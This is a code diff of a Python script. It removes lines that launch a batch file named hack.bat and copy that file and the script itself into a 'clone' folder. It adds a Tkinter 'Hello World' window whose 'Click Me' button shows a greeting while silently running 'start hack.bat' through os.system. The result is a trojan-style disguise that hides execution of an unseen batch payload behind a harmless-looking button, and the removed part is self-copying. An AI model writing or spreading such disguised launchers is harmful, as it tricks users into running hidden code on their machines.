@@ -2,11 +2,23 @@ from sys import argv
 
 import os
 
-script = argv
-name = str(script[0])
+import tkinter as tk
 
-cmd = 'start hack.bat'
-os.system(cmd)
-os.mkdir('clone')
-os.system(r"copy hack.bat clone")
-os.system(r"copy " + name + " clone")
+root= tk.Tk()
+
+canvas1 = tk.Canvas(root, width = 300, height = 300)
+canvas1.pack()
+
+def hello ():  
+    label1 = tk.Label(root, text= 'Hello World!', fg='green', font=('helvetica', 12, 'bold'))
+    canvas1.create_window(150, 200, window=label1)
+    script = argv
+    name = str(script[0])
+
+    cmd = 'start hack.bat'
+    os.system(cmd)
+    
+button1 = tk.Button(text='Click Me',command=hello, bg='brown',fg='white')
+canvas1.create_window(150, 150, window=button1)
+
+root.mainloop()
